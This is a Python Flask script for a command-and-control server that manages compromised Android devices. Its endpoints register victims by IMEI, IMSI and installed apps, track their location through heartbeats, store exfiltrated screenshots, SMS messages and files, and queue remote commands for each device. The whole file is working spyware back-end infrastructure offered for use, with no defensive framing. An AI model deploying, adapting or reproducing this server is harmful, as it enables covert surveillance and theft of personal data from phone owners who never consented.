#!/usr/bin/env python3
"""
c2_server.py — Lightweight Flask C2 server for Android payloads
Usage: python3 c2_server.py --host 0.0.0.0 --port 443 --output /data/exfil

Endpoints:
  POST /register   — Device registration with fingerprint
  POST /heartbeat  — Regular check-in with status
  POST /exfil      — Exfiltrate data (screenshots, SMS, location, files)
  GET  /cmd/<id>   — Pending commands for device
"""

import os
import sys
import json
import argparse
import hashlib
from datetime import datetime, timezone
from flask import Flask, request, jsonify, g

app = Flask(__name__)
DEVICES_FILE = ""
EXFIL_DIR = ""

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json(force=True)
    device_id = data.get('device_id', 'unknown')
    fingerprint = {
        'device_id': device_id,
        'model': data.get('model', ''),
        'manufacturer': data.get('manufacturer', ''),
        'android_version': data.get('android_version', ''),
        'security_patch': data.get('security_patch', ''),
        'installed_apps': data.get('installed_apps', []),
        'imei': data.get('imei', ''),
        'imsi': data.get('imsi', ''),
        'first_seen': datetime.now(timezone.utc).isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
    }
    save_device(device_id, fingerprint)
    log_event(device_id, 'REGISTER', f"Device registered from {request.remote_addr}")
    return jsonify({'status': 'ok', 'device_id': device_id})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json(force=True)
    device_id = data.get('device_id', 'unknown')
    status = {
        'last_seen': datetime.now(timezone.utc).isoformat(),
        'battery': data.get('battery', -1),
        'location': data.get('location', {}),
        'screen_on': data.get('screen_on', False),
        'ip': request.remote_addr,
    }
    update_device_status(device_id, status)
    return jsonify({'status': 'ok'})

@app.route('/exfil', methods=['POST'])
def exfil_data():
    data = request.get_json(force=True)
    device_id = data.get('device_id', 'unknown')
    exfil_type = data.get('type', 'unknown')
    payload = data.get('data', '')

    ts = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
    device_dir = os.path.join(EXFIL_DIR, device_id, exfil_type)
    os.makedirs(device_dir, exist_ok=True)

    if data.get('filename'):
        safe_name = os.path.basename(data['filename'])
        filepath = os.path.join(device_dir, f"{ts}_{safe_name}")
    else:
        filepath = os.path.join(device_dir, f"{ts}.json")

    with open(filepath, 'w') as f:
        if isinstance(payload, (dict, list)):
            json.dump(payload, f, indent=2, default=str)
        else:
            # Binary data — decode from hex
            f.write(bytes.fromhex(payload).decode('utf-8', errors='replace'))

    sha = hashlib.sha256(open(filepath, 'rb').read()).hexdigest()
    log_event(device_id, 'EXFIL', f"{exfil_type} → {filepath} (SHA256: {sha[:16]}...)")
    return jsonify({'status': 'ok', 'file': filepath, 'sha256': sha})

@app.route('/cmd/<device_id>', methods=['GET'])
def get_commands(device_id):
    cmd_file = os.path.join(EXFIL_DIR, device_id, 'pending_cmds.json')
    if os.path.exists(cmd_file):
        with open(cmd_file) as f:
            cmds = json.load(f)
        os.remove(cmd_file)
        return jsonify({'commands': cmds})
    return jsonify({'commands': []})

def save_device(device_id, data):
    path = os.path.join(EXFIL_DIR, device_id, 'device_info.json')
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def update_device_status(device_id, data):
    path = os.path.join(EXFIL_DIR, device_id, 'device_info.json')
    if os.path.exists(path):
        with open(path) as f:
            info = json.load(f)
    else:
        info = {}
    info.update(data)
    with open(path, 'w') as f:
        json.dump(info, f, indent=2)

def log_event(device_id, event_type, detail):
    log_path = os.path.join(EXFIL_DIR, 'operation.log')
    ts = datetime.now(timezone.utc).isoformat()
    with open(log_path, 'a') as f:
        f.write(f"[{ts}] [{device_id}] [{event_type}] {detail}\n")

def main():
    global EXFIL_DIR
    parser = argparse.ArgumentParser(description='Android C2 Server')
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=443)
    parser.add_argument('--ssl', action='store_true')
    parser.add_argument('--cert', default='cert.pem')
    parser.add_argument('--key', default='key.pem')
    parser.add_argument('--output', required=True, help='Exfiltration output directory')
    args = parser.parse_args()

    EXFIL_DIR = os.path.abspath(args.output)
    os.makedirs(EXFIL_DIR, exist_ok=True)

    print(f"""
╔══════════════════════════════════════════════╗
║         Android C2 Server v2.0               ║
╠══════════════════════════════════════════════╣
║ Listening:  {args.host}:{args.port}
║ Exfil dir:  {EXFIL_DIR}
║ SSL:        {args.ssl}
╚══════════════════════════════════════════════╝
    """)

    if args.ssl:
        app.run(host=args.host, port=args.port, ssl_context=(args.cert, args.key))
    else:
        app.run(host=args.host, port=args.port)

if __name__ == '__main__':
    main()
